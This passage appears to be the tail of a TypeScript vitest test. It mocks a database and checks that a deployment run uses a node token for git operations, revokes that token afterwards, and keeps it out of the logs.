    const { db } = linkedDb();
    db.select.mockImplementation(() => ({
      from: vi.fn((table: unknown) => {
        const rows = table === serviceTargets ? [{ serverId: 9, runtimeId: null }] : [];
        return {
          where: vi.fn(() => Object.assign(Promise.resolve(rows), { limit: vi.fn(() => Promise.resolve(rows)) })),
          leftJoin: vi.fn(() => Promise.resolve([])),
          innerJoin: vi.fn(() => Promise.resolve([])),
          orderBy: vi.fn(() => Promise.resolve([])),
          // biome-ignore lint/suspicious/noThenProperty: intentional thenable — the fake DB query result must be awaitable by the code under test.
          then: (ok: (v: unknown) => unknown) => ok(rows),
        };
      }),
    }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.some((l) => l.startsWith('Fan-out skipped'))).toBe(false);
    expect(gitCalls().find((c) => c.server === 9 && c.op === 'git.ensure')?.credential).toBe(NODE_TOKEN);
    expect(h.revokeInstallationToken).toHaveBeenCalledWith(expect.anything(), NODE_TOKEN);
    expect(lines.join('\n')).not.toContain(NODE_TOKEN);
  });
});
